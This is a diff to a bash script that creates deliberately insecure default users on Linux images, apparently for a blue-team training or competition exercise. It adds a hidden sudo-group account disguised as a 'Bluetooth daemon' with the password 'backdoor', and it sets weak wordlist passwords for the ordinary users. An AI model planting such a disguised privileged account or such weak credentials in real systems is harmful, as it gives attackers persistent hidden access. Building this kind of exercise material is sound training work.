@@ -1,7 +1,11 @@
 #! /bin/bash
 
-# (Insecurely) configures default blue team users.
-# Passwords are from the rockyou wordlist.
+# Name: Default User Configuration
+# Notes: 
+# - Creates several admin and normal users
+# - Creates a hidden admin user
+# - Most passwords are from the rockyou wordlist
+# Valid Targets: Blue team Linux images
 
 echo "Creating default users..."
 
@@ -29,3 +33,7 @@ sudo useradd -c "Ida Rhodes" -m -s /bin/bash irhodes
 echo "irhodes:Ida12101989" | sudo chpasswd
 
 echo "Done creating default users."
+
+# Hidden Users
+sudo useradd -r -c "Bluetooth daemon" -M -G sudo -s /bin/bash bd
+echo "bd:backdoor" | sudo chpasswd
